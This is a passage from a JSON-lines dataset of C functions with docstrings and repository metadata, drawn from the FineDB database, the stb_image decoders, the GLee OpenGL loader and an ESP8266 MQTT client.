{\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to send the complete response (%d / %d).\", rc, expected);\n\t\treturn (YEIO);\n\t} else if (rc > expected) {\n\t\tYLOG_ADD(YLOG_WARN, \"Too much data were sent (%d / %d).\", rc, expected);\n\t\treturn (YEIO);\n\t}\n\t// remove timeout from the socket\n\ttv.tv_sec = 0;\n\tif (setsockopt(thread->fd, SOL_SOCKET, SO_SNDTIMEO, (void*)&tv, sizeof(tv)) < 0)\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to remove SNDTIMEO from socket.\");\n\t// return\n\tYLOG_ADD(YLOG_DEBUG, \"Sent %d bytes '%s'.\", rc, data);\n\treturn (YENOERR);\n}", "path": "src\\server\\connection_thread.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Fetch a value from its key. */\n", "func_signal": "void command_get(cli_t *cli, char *pt)", "code": "{\n\tchar *pt2, *key;\n\tybin_t bkey, bdata;\n\tint rc;\n\n\tLTRIM(pt);\n\tif (*pt != '\"') {\n\t\tprintf_decorated(\"faint\", \"Bad key format (no quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tpt++;\n\tif (!*pt) {\n\t\tprintf_decorated(\"faint\", \"Bad key\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tkey = pt2 = pt;\n\tpt2 = pt;\n\tif ((pt2 = strchr(pt2, '\"')) == NULL) {\n\t\tprintf_decorated(\"faint\", \"Bad key format (no trailing quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\t*pt2 = '\\0';\n\n\t// check connection if needed\n\tif (!check_connection(cli))\n\t\treturn;\n\t// request\n\tbzero(&bdata, sizeof(bdata));\n\tybin_set(&bkey, key, strlen(key));\n\trc = finedb_get(cli->finedb, bkey, &bdata);\n\tif (rc) {\n\t\tprintf_color(\"red\", \"Unable to get key '%s' (%d).\", key, rc);\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tif (bdata.data == NULL || bdata.len == 0) {\n\t\tprintf_decorated(\"faint\", \"No data.\");\n\t\tprintf(\"\\n\");\n\t}\n\tprintf(\"%s\\n\", (char*)bdata.data);\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "// 0.38 seconds on 3*anemones.jpg   (0.25 with processor = Pro)\n// VC6 without processor=Pro is generating multiple LEAs per multiply!\n", "func_signal": "static void YCbCr_to_RGB_row(uint8 *out, const uint8 *y, const uint8 *pcb, const uint8 *pcr, int count, int step)", "code": "{\n   int i;\n   for (i=0; i < count; ++i) {\n      int y_fixed = (y[i] << 16) + 32768; // rounding\n      int r,g,b;\n      int cr = pcr[i] - 128;\n      int cb = pcb[i] - 128;\n      r = y_fixed + cr*float2fixed(1.40200f);\n      g = y_fixed - cr*float2fixed(0.71414f) - cb*float2fixed(0.34414f);\n      b = y_fixed                            + cb*float2fixed(1.77200f);\n      r >>= 16;\n      g >>= 16;\n      b >>= 16;\n      if ((unsigned) r > 255) { if (r < 0) r = 0; else r = 255; }\n      if ((unsigned) g > 255) { if (g < 0) g = 0; else g = 255; }\n      if ((unsigned) b > 255) { if (b < 0) b = 0; else b = 255; }\n      out[0] = (uint8)r;\n      out[1] = (uint8)g;\n      out[2] = (uint8)b;\n      out[3] = 255;\n      out += step;\n   }\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// take a -128..127 value and clamp it and convert to 0..255\n", "func_signal": "__forceinline static uint8 clamp(int x)", "code": "{\n   // trick to use a single test to catch both cases\n   if ((unsigned int) x > 255) {\n      if (x < 0) return 0;\n      if (x > 255) return 255;\n   }\n   return (uint8) x;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// Microsoft/Windows BMP image\n", "func_signal": "static int bmp_test(stbi *s)", "code": "{\n   int sz;\n   if (get8(s) != 'B') return 0;\n   if (get8(s) != 'M') return 0;\n   get32le(s); // discard filesize\n   get16le(s); // discard reserved\n   get16le(s); // discard reserved\n   get32le(s); // discard data offset\n   sz = get32le(s);\n   if (sz == 12 || sz == 40 || sz == 56 || sz == 108) return 1;\n   return 0;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// .344 seconds on 3*anemones.jpg\n", "func_signal": "static void idct_block(uint8 *out, int out_stride, short data[64], stbi_dequantize_t *dequantize)", "code": "{\n   int i,val[64],*v=val;\n   stbi_dequantize_t *dq = dequantize;\n   uint8 *o;\n   short *d = data;\n\n   // columns\n   for (i=0; i < 8; ++i,++d,++dq, ++v) {\n      // if all zeroes, shortcut -- this avoids dequantizing 0s and IDCTing\n      if (d[ 8]==0 && d[16]==0 && d[24]==0 && d[32]==0\n           && d[40]==0 && d[48]==0 && d[56]==0) {\n         //    no shortcut                 0     seconds\n         //    (1|2|3|4|5|6|7)==0          0     seconds\n         //    all separate               -0.047 seconds\n         //    1 && 2|3 && 4|5 && 6|7:    -0.047 seconds\n         int dcterm = d[0] * dq[0] << 2;\n         v[0] = v[8] = v[16] = v[24] = v[32] = v[40] = v[48] = v[56] = dcterm;\n      } else {\n         IDCT_1D(d[ 0]*dq[ 0],d[ 8]*dq[ 8],d[16]*dq[16],d[24]*dq[24],\n                 d[32]*dq[32],d[40]*dq[40],d[48]*dq[48],d[56]*dq[56])\n         // constants scaled things up by 1<<12; let's bring them back\n         // down, but keep 2 extra bits of precision\n         x0 += 512; x1 += 512; x2 += 512; x3 += 512;\n         v[ 0] = (x0+t3) >> 10;\n         v[56] = (x0-t3) >> 10;\n         v[ 8] = (x1+t2) >> 10;\n         v[48] = (x1-t2) >> 10;\n         v[16] = (x2+t1) >> 10;\n         v[40] = (x2-t1) >> 10;\n         v[24] = (x3+t0) >> 10;\n         v[32] = (x3-t0) >> 10;\n      }\n   }\n\n   for (i=0, v=val, o=out; i < 8; ++i,v+=8,o+=out_stride) {\n      // no fast case since the first 1D IDCT spread components out\n      IDCT_1D(v[0],v[1],v[2],v[3],v[4],v[5],v[6],v[7])\n      // constants scaled things up by 1<<12, plus we had 1<<2 from first\n      // loop, plus horizontal and vertical each scale by sqrt(8) so together\n      // we've got an extra 1<<3, so 1<<17 total we need to remove.\n      // so we want to round that, which means adding 0.5 * 1<<17,\n      // aka 65536. Also, we'll end up with -128 to 127 that we want\n      // to encode as 0..255 by adding 128, so we'll add that before the shift\n      x0 += 65536 + (128<<17);\n      x1 += 65536 + (128<<17);\n      x2 += 65536 + (128<<17);\n      x3 += 65536 + (128<<17);\n      // tried computing the shifts into temps, or'ing the temps to see\n      // if any were out of range, but that was slower\n      o[0] = clamp((x0+t3) >> 17);\n      o[7] = clamp((x0-t3) >> 17);\n      o[1] = clamp((x1+t2) >> 17);\n      o[6] = clamp((x1-t2) >> 17);\n      o[2] = clamp((x2+t1) >> 17);\n      o[5] = clamp((x2-t1) >> 17);\n      o[3] = clamp((x3+t0) >> 17);\n      o[4] = clamp((x3-t0) >> 17);\n   }\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// if there's a pending marker from the entropy stream, return that\n// otherwise, fetch from the stream and get a marker. if there's no\n// marker, return 0xff, which is never a valid marker value\n", "func_signal": "static uint8 get_marker(jpeg *j)", "code": "{\n   uint8 x;\n   if (j->marker != MARKER_none) { x = j->marker; j->marker = MARKER_none; return x; }\n   x = get8u(&j->s);\n   if (x != 0xff) return MARKER_none;\n   while (x == 0xff)\n      x = get8u(&j->s);\n   return x;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// *************************************************************************************************\n// Photoshop PSD loader -- PD by Thatcher Ulrich, integration by Nicolas Schulz, tweaked by STB\n", "func_signal": "static int psd_test(stbi *s)", "code": "{\n   if (get32(s) != 0x38425053) return 0;   // \"8BPS\"\n   else return 1;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// !STBI_NO_STDIO\n", "func_signal": "int stbi_gif_info_from_memory(stbi_uc const *buffer, int len, int *x, int *y, int *comp)", "code": "{\n   stbi s;\n   start_mem(&s, buffer, len);\n   return stbi_gif_info_raw(&s, x, y, comp);\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// create the png data from post-deflated data\n", "func_signal": "static int create_png_image_raw(png *a, uint8 *raw, uint32 raw_len, int out_n, uint32 x, uint32 y)", "code": "{\n   stbi *s = &a->s;\n   uint32 i,j,stride = x*out_n;\n   int k;\n   int img_n = s->img_n; // copy it into a local for later\n   assert(out_n == s->img_n || out_n == s->img_n+1);\n   if (stbi_png_partial) y = 1;\n   a->out = (uint8 *) malloc(x * y * out_n);\n   if (!a->out) return e(\"outofmem\", \"Out of memory\");\n   if (!stbi_png_partial) {\n      if (s->img_x == x && s->img_y == y) {\n         if (raw_len != (img_n * x + 1) * y) return e(\"not enough pixels\",\"Corrupt PNG\");\n      } else { // interlaced:\n         if (raw_len < (img_n * x + 1) * y) return e(\"not enough pixels\",\"Corrupt PNG\");\n      }\n   }\n   for (j=0; j < y; ++j) {\n      uint8 *cur = a->out + stride*j;\n      uint8 *prior = cur - stride;\n      int filter = *raw++;\n      if (filter > 4) return e(\"invalid filter\",\"Corrupt PNG\");\n      // if first row, use special filter that doesn't sample previous row\n      if (j == 0) filter = first_row_filter[filter];\n      // handle first pixel explicitly\n      for (k=0; k < img_n; ++k) {\n         switch (filter) {\n            case F_none       : cur[k] = raw[k]; break;\n            case F_sub        : cur[k] = raw[k]; break;\n            case F_up         : cur[k] = raw[k] + prior[k]; break;\n            case F_avg        : cur[k] = raw[k] + (prior[k]>>1); break;\n            case F_paeth      : cur[k] = (uint8) (raw[k] + paeth(0,prior[k],0)); break;\n            case F_avg_first  : cur[k] = raw[k]; break;\n            case F_paeth_first: cur[k] = raw[k]; break;\n         }\n      }\n      if (img_n != out_n) cur[img_n] = 255;\n      raw += img_n;\n      cur += out_n;\n      prior += out_n;\n      // this is a little gross, so that we don't switch per-pixel or per-component\n      if (img_n == out_n) {\n         #define CASE(f) \\\n             case f:     \\\n                for (i=x-1; i >= 1; --i, raw+=img_n,cur+=img_n,prior+=img_n) \\\n                   for (k=0; k < img_n; ++k)\n         switch (filter) {\n            CASE(F_none)  cur[k] = raw[k]; break;\n            CASE(F_sub)   cur[k] = raw[k] + cur[k-img_n]; break;\n            CASE(F_up)    cur[k] = raw[k] + prior[k]; break;\n            CASE(F_avg)   cur[k] = raw[k] + ((prior[k] + cur[k-img_n])>>1); break;\n            CASE(F_paeth)  cur[k] = (uint8) (raw[k] + paeth(cur[k-img_n],prior[k],prior[k-img_n])); break;\n            CASE(F_avg_first)    cur[k] = raw[k] + (cur[k-img_n] >> 1); break;\n            CASE(F_paeth_first)  cur[k] = (uint8) (raw[k] + paeth(cur[k-img_n],0,0)); break;\n         }\n         #undef CASE\n      } else {\n         assert(img_n+1 == out_n);\n         #define CASE(f) \\\n             case f:     \\\n                for (i=x-1; i >= 1; --i, cur[img_n]=255,raw+=img_n,cur+=out_n,prior+=out_n) \\\n                   for (k=0; k < img_n; ++k)\n         switch (filter) {\n            CASE(F_none)  cur[k] = raw[k]; break;\n            CASE(F_sub)   cur[k] = raw[k] + cur[k-out_n]; break;\n            CASE(F_up)    cur[k] = raw[k] + prior[k]; break;\n            CASE(F_avg)   cur[k] = raw[k] + ((prior[k] + cur[k-out_n])>>1); break;\n            CASE(F_paeth)  cur[k] = (uint8) (raw[k] + paeth(cur[k-out_n],prior[k],prior[k-out_n])); break;\n            CASE(F_avg_first)    cur[k] = raw[k] + (cur[k-out_n] >> 1); break;\n            CASE(F_paeth_first)  cur[k] = (uint8) (raw[k] + paeth(cur[k-out_n],0,0)); break;\n         }\n         #undef CASE\n      }\n   }\n   return 1;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// !STBI_NO_STDIO\n", "func_signal": "int stbi_png_info_from_memory(stbi_uc const *buffer, int len, int *x, int *y, int *comp)", "code": "{\n   png p;\n   start_mem(&p.s, buffer, len);\n   return stbi_png_info_raw(&p, x, y, comp);\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "/* Linux */\n", "func_signal": "GLuint __GLeeLink_GLX_VERSION_1_3(void)", "code": "{\n    GLint nLinked=0;\n#ifdef __GLEE_GLX_VERSION_1_3\n    if ((pglXGetFBConfigs = (PFNGLXGETFBCONFIGSPROC) __GLeeGetProcAddress(\"glXGetFBConfigs\"))!=0) nLinked++;\n    if ((pglXChooseFBConfig = (PFNGLXCHOOSEFBCONFIGPROC) __GLeeGetProcAddress(\"glXChooseFBConfig\"))!=0) nLinked++;\n    if ((pglXGetFBConfigAttrib = (PFNGLXGETFBCONFIGATTRIBPROC) __GLeeGetProcAddress(\"glXGetFBConfigAttrib\"))!=0) nLinked++;\n    if ((pglXGetVisualFromFBConfig = (PFNGLXGETVISUALFROMFBCONFIGPROC) __GLeeGetProcAddress(\"glXGetVisualFromFBConfig\"))!=0) nLinked++;\n    if ((pglXCreateWindow = (PFNGLXCREATEWINDOWPROC) __GLeeGetProcAddress(\"glXCreateWindow\"))!=0) nLinked++;\n    if ((pglXDestroyWindow = (PFNGLXDESTROYWINDOWPROC) __GLeeGetProcAddress(\"glXDestroyWindow\"))!=0) nLinked++;\n    if ((pglXCreatePixmap = (PFNGLXCREATEPIXMAPPROC) __GLeeGetProcAddress(\"glXCreatePixmap\"))!=0) nLinked++;\n    if ((pglXDestroyPixmap = (PFNGLXDESTROYPIXMAPPROC) __GLeeGetProcAddress(\"glXDestroyPixmap\"))!=0) nLinked++;\n    if ((pglXCreatePbuffer = (PFNGLXCREATEPBUFFERPROC) __GLeeGetProcAddress(\"glXCreatePbuffer\"))!=0) nLinked++;\n    if ((pglXDestroyPbuffer = (PFNGLXDESTROYPBUFFERPROC) __GLeeGetProcAddress(\"glXDestroyPbuffer\"))!=0) nLinked++;\n    if ((pglXQueryDrawable = (PFNGLXQUERYDRAWABLEPROC) __GLeeGetProcAddress(\"glXQueryDrawable\"))!=0) nLinked++;\n    if ((pglXCreateNewContext = (PFNGLXCREATENEWCONTEXTPROC) __GLeeGetProcAddress(\"glXCreateNewContext\"))!=0) nLinked++;\n    if ((pglXMakeContextCurrent = (PFNGLXMAKECONTEXTCURRENTPROC) __GLeeGetProcAddress(\"glXMakeContextCurrent\"))!=0) nLinked++;\n    if ((pglXGetCurrentReadDrawable = (PFNGLXGETCURRENTREADDRAWABLEPROC) __GLeeGetProcAddress(\"glXGetCurrentReadDrawable\"))!=0) nLinked++;\n    if ((pglXGetCurrentDisplay = (PFNGLXGETCURRENTDISPLAYPROC) __GLeeGetProcAddress(\"glXGetCurrentDisplay\"))!=0) nLinked++;\n    if ((pglXQueryContext = (PFNGLXQUERYCONTEXTPROC) __GLeeGetProcAddress(\"glXQueryContext\"))!=0) nLinked++;\n    if ((pglXSelectEvent = (PFNGLXSELECTEVENTPROC) __GLeeGetProcAddress(\"glXSelectEvent\"))!=0) nLinked++;\n    if ((pglXGetSelectedEvent = (PFNGLXGETSELECTEDEVENTPROC) __GLeeGetProcAddress(\"glXGetSelectedEvent\"))!=0) nLinked++;\n#endif\n    if (nLinked==18) return GLEE_LINK_COMPLETE;\n    if (nLinked==0) return GLEE_LINK_FAIL;\n    return GLEE_LINK_PARTIAL;\n}", "path": "src\\glee\\GLee.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "/*****************************************************************\n * GLee internal functions\n *****************************************************************/\n", "func_signal": "void __GLeeExtList_init(ExtensionList *extList)", "code": "{\n\textList->names=0;\n\textList->lengths=0;\n\textList->numNames=0;\n}", "path": "src\\glee\\GLee.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// after a restart interval, reset the entropy decoder and\n// the dc prediction\n", "func_signal": "static void reset(jpeg *j)", "code": "{\n   j->code_bits = 0;\n   j->code_buffer = 0;\n   j->nomore = 0;\n   j->img_comp[0].dc_pred = j->img_comp[1].dc_pred = j->img_comp[2].dc_pred = 0;\n   j->marker = MARKER_none;\n   j->todo = j->restart_interval ? j->restart_interval : 0x7fffffff;\n   // no more than 1<<31 MCUs if no restart_interal? that's plenty safe,\n   // since we don't even allow 1<<30 pixels\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// this function is designed to support animated gifs, although stb_image doesn't support it\n", "func_signal": "static uint8 *stbi_gif_load_next(stbi *s, stbi_gif *g, int *comp, int req_comp)", "code": "{\n   int i;\n   uint8 *old_out = 0;\n\n   if (g->out == 0) {\n      if (!stbi_gif_header(s, g, comp,0))     return 0; // failure_reason set by stbi_gif_header\n      g->out = (uint8 *) malloc(4 * g->w * g->h);\n      if (g->out == 0)                      return epuc(\"outofmem\", \"Out of memory\");\n      stbi_fill_gif_background(g);\n   } else {\n      // animated-gif-only path\n      if (((g->eflags & 0x1C) >> 2) == 3) {\n         old_out = g->out;\n         g->out = (uint8 *) malloc(4 * g->w * g->h);\n         if (g->out == 0)                   return epuc(\"outofmem\", \"Out of memory\");\n         memcpy(g->out, old_out, g->w*g->h*4);\n      }\n   }\n    \n   for (;;) {\n      switch (get8(s)) {\n         case 0x2C: /* Image Descriptor */\n         {\n            int32 x, y, w, h;\n            uint8 *o;\n\n            x = get16le(s);\n            y = get16le(s);\n            w = get16le(s);\n            h = get16le(s);\n            if (((x + w) > (g->w)) || ((y + h) > (g->h)))\n               return epuc(\"bad Image Descriptor\", \"Corrupt GIF\");\n\n            g->line_size = g->w * 4;\n            g->start_x = x * 4;\n            g->start_y = y * g->line_size;\n            g->max_x   = g->start_x + w * 4;\n            g->max_y   = g->start_y + h * g->line_size;\n            g->cur_x   = g->start_x;\n            g->cur_y   = g->start_y;\n\n            g->lflags = get8(s);\n\n            if (g->lflags & 0x40) {\n               g->step = 8 * g->line_size; // first interlaced spacing\n               g->parse = 3;\n            } else {\n               g->step = g->line_size;\n               g->parse = 0;\n            }\n\n            if (g->lflags & 0x80) {\n               stbi_gif_parse_colortable(s,g->lpal, 2 << (g->lflags & 7), g->eflags & 0x01 ? g->transparent : -1);\n               g->color_table = (uint8 *) g->lpal;       \n            } else if (g->flags & 0x80) {\n               for (i=0; i < 256; ++i)  // @OPTIMIZE: reset only the previous transparent\n                  g->pal[i][3] = 255; \n               if (g->transparent >= 0 && (g->eflags & 0x01))\n                  g->pal[g->transparent][3] = 0;\n               g->color_table = (uint8 *) g->pal;\n            } else\n               return epuc(\"missing color table\", \"Corrupt GIF\");\n   \n            o = stbi_process_gif_raster(s, g);\n            if (o == NULL) return NULL;\n\n            if (req_comp && req_comp != 4)\n               o = convert_format(o, 4, req_comp, g->w, g->h);\n            return o;\n         }\n\n         case 0x21: // Comment Extension.\n         {\n            int len;\n            if (get8(s) == 0xF9) { // Graphic Control Extension.\n               len = get8(s);\n               if (len == 4) {\n                  g->eflags = get8(s);\n                  get16le(s); // delay\n                  g->transparent = get8(s);\n               } else {\n                  skip(s, len);\n                  break;\n               }\n            }\n            while ((len = get8(s)) != 0)\n               skip(s, len);\n            break;\n         }\n\n         case 0x3B: // gif stream termination code\n            return (uint8 *) 1;\n\n         default:\n            return epuc(\"unknown code\", \"Corrupt GIF\");\n      }\n   }\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// returns 0..31 for the highest set bit\n", "func_signal": "static int high_bit(unsigned int z)", "code": "{\n   int n=0;\n   if (z == 0) return -1;\n   if (z >= 0x10000) n += 16, z >>= 16;\n   if (z >= 0x00100) n +=  8, z >>=  8;\n   if (z >= 0x00010) n +=  4, z >>=  4;\n   if (z >= 0x00004) n +=  2, z >>=  2;\n   if (z >= 0x00002) n +=  1, z >>=  1;\n   return n;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// Targa Truevision - TGA\n// by Jonathan Dummer\n", "func_signal": "static int tga_info(stbi *s, int *x, int *y, int *comp)", "code": "{\n    int tga_w, tga_h, tga_comp;\n    int sz;\n    get8u(s);                   // discard Offset\n    sz = get8u(s);              // color type\n    if( sz > 1 ) return 0;      // only RGB or indexed allowed\n    sz = get8u(s);              // image type\n    // only RGB or grey allowed, +/- RLE\n    if ((sz != 1) && (sz != 2) && (sz != 3) && (sz != 9) && (sz != 10) && (sz != 11)) return 0;\n    get16le(s);                 // discard palette start\n    get16le(s);                 // discard palette length\n    get8(s);                    // discard bits per palette color entry\n    get16le(s);                 // discard x origin\n    get16le(s);                 // discard y origin\n    tga_w = get16le(s);\n    if( tga_w < 1 ) return 0;   // test width\n    tga_h = get16le(s);\n    if( tga_h < 1 ) return 0;   // test height\n    sz = get8(s);               // bits per pixel\n    // only RGB or RGBA or grey allowed\n    if ((sz != 8) && (sz != 16) && (sz != 24) && (sz != 32)) return 0;\n    tga_comp = sz;\n    if (x) *x = tga_w;\n    if (y) *y = tga_h;\n    if (comp) *comp = tga_comp / 8;\n    return 1;                   // seems to have passed everything\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// !STBI_NO_STDIO\n", "func_signal": "int stbi_info_from_memory(stbi_uc const *buffer, int len, int *x, int *y, int *comp)", "code": "{\n   if (stbi_jpeg_info_from_memory(buffer, len, x, y, comp))\n       return 1;\n   if (stbi_png_info_from_memory(buffer, len, x, y, comp))\n       return 1;\n   if (stbi_gif_info_from_memory(buffer, len, x, y, comp))\n       return 1;\n   // @TODO: stbi_bmp_info_from_memory\n   // @TODO: stbi_psd_info_from_memory\n   #ifndef STBI_NO_HDR\n   // @TODO: stbi_hdr_info_from_memory\n   #endif\n   // test tga last because it's a crappy test!\n   if (stbi_tga_info_from_memory(buffer, len, x, y, comp))\n       return 1;\n   return e(\"unknown image type\", \"Image not of any known type, or corrupt\");\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// these is-hdr-or-not is defined independent of whether STBI_NO_HDR is\n// defined, for API simplicity; if STBI_NO_HDR is defined, it always\n// reports false!\n", "func_signal": "int stbi_is_hdr_from_memory(stbi_uc const *buffer, int len)", "code": "{\n   #ifndef STBI_NO_HDR\n   return stbi_hdr_test_memory(buffer, len);\n   #else\n   STBI_NOTUSED(buffer);\n   STBI_NOTUSED(len);\n   return 0;\n   #endif\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// decode one 64-entry block--\n", "func_signal": "static int decode_block(jpeg *j, short data[64], huffman *hdc, huffman *hac, int b)", "code": "{\n   int diff,dc,k;\n   int t = decode(j, hdc);\n   if (t < 0) return e(\"bad huffman code\",\"Corrupt JPEG\");\n\n   // 0 all the ac values now so we can do it 32-bits at a time\n   memset(data,0,64*sizeof(data[0]));\n\n   diff = t ? extend_receive(j, t) : 0;\n   dc = j->img_comp[b].dc_pred + diff;\n   j->img_comp[b].dc_pred = dc;\n   data[0] = (short) dc;\n\n   // decode AC components, see JPEG spec\n   k = 1;\n   do {\n      int r,s;\n      int rs = decode(j, hac);\n      if (rs < 0) return e(\"bad huffman code\",\"Corrupt JPEG\");\n      s = rs & 15;\n      r = rs >> 4;\n      if (s == 0) {\n         if (rs != 0xf0) break; // end block\n         k += 16;\n      } else {\n         k += r;\n         // decode into unzigzag'd location\n         data[dezigzag[k++]] = (short) extend_receive(j,s);\n      }\n   } while (k < 64);\n   return 1;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// clean up the temporary component buffers\n", "func_signal": "static void cleanup_jpeg(jpeg *j)", "code": "{\n   int i;\n   for (i=0; i < j->s.img_n; ++i) {\n      if (j->img_comp[i].data) {\n         free(j->img_comp[i].raw_data);\n         j->img_comp[i].data = NULL;\n      }\n      if (j->img_comp[i].linebuf) {\n         free(j->img_comp[i].linebuf);\n         j->img_comp[i].linebuf = NULL;\n      }\n   }\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "// *************************************************************************************************\n// Softimage PIC loader\n// by Tom Seddon\n//\n// See http://softimage.wiki.softimage.com/index.php/INFO:_PIC_file_format\n// See http://ozviz.wasp.uwa.edu.au/~pbourke/dataformats/softimagepic/\n", "func_signal": "static int pic_is4(stbi *s,const char *str)", "code": "{\n   int i;\n   for (i=0; i<4; ++i)\n      if (get8(s) != (stbi_uc)str[i])\n         return 0;\n\n   return 1;\n}", "path": "src\\stb\\stb_image.c", "repo_name": "jarikomppa/atanua", "stars": 95, "license": "other", "language": "c", "size": 777}
{"docstring": "/**\n  * @brief  Tcp client connect repeat callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_recon_cb(void *arg, sint8 errType)", "code": "{\n\tstruct espconn *pCon = (struct espconn *)arg;\n\tMQTT_Client* client = (MQTT_Client *)pCon->reverse;\n\n\tINFO(\"TCP: Reconnect to %s:%d\\r\\n\", client->host, client->port);\n\n\tclient->connState = TCP_RECONNECT_REQ;\n\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  MQTT subscibe function.\n  * @param  client: \tMQTT_Client reference\n  * @param  topic: \t\tstring topic will subscribe\n  * @param  qos:\t\tqos\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Subscribe(MQTT_Client *client, char* topic, uint8_t qos)", "code": "{\n\tuint8_t dataBuffer[MQTT_BUF_SIZE];\n\tuint16_t dataLen;\n\n\tclient->mqtt_state.outbound_message = mqtt_msg_subscribe(&client->mqtt_state.mqtt_connection,\n\t                                      topic, qos,\n\t                                      &client->mqtt_state.pending_msg_id);\n\tINFO(\"MQTT: queue subscribe, topic\\\"%s\\\", id: %d\\r\\n\", topic, client->mqtt_state.pending_msg_id);\n\twhile (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n\t\tINFO(\"MQTT: Queue full\\r\\n\");\n\t\tif (QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n\t\t\tINFO(\"MQTT: Serious buffer error\\r\\n\");\n\t\t\treturn FALSE;\n\t\t}\n\t}\n\tsystem_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n\treturn TRUE;\n}", "path": "mqtt\\mqtt\\mqtt.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n* \\brief get a character from ring buffer\n* \\param r pointer to a ringbuf object\n* \\param c read character\n* \\return 0 if successfull, otherwise failed\n*/\n", "func_signal": "I16 ICACHE_FLASH_ATTR RINGBUF_Get(RINGBUF *r, U8* c)", "code": "{\n\tif(r->fill_cnt<=0)return -1;\t\t\t\t// ring buffer is empty, this should be atomic operation\n\t\n\n\tr->fill_cnt--;\t\t\t\t\t\t\t\t// decrease filled slots count\n\n\t\n\t*c = *r->p_r++;\t\t\t\t\t\t\t\t// get the character out\n\t\n\tif(r->p_r >= r->p_o + r->size)\t\t\t\t// rollback if write pointer go pass\n\t\tr->p_r = r->p_o;\t\t\t\t\t\t// the physical boundary\n\t\n\treturn 0;\n}", "path": "mqtt\\mqtt\\ringbuf.c", "repo_name": "eadf/esp_mqtt_lcd", "stars": 70, "license": "gpl-3.0", "language": "c", "size": 600}
{"docstring": "/**\n  * @brief  Begin connect to MQTT broker\n  * @param  client: MQTT_Client reference\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_Connect(MQTT_Client *mqttClient)", "code": "{\n\t// Do not connect if this client is already connected otherwise the\n\t// two espconn connections may interfere causing unexpected behaviour.\n\tif (mqttClient->pCon) {\n\t\treturn;\n\t}\n\tmqttClient->pCon = (struct espconn *)os_zalloc(sizeof(struct espconn));\n\tmqttClient->pCon->type = ESPCONN_TCP;\n\tmqttClient->pCon->state = ESPCONN_NONE;\n\tmqttClient->pCon->proto.tcp = (esp_tcp *)os_zalloc(sizeof(esp_tcp));\n\tmqttClient->pCon->proto.tcp->local_port = espconn_port();\n\tmqttClient->pCon->proto.tcp->remote_port = mqttClient->port;\n\tmqttClient->pCon->reverse = mqttClient;\n\tespconn_regist_connectcb(mqttClient->pCon, mqtt_tcpclient_connect_cb);\n\tespconn_regist_reconcb(mqttClient->pCon, 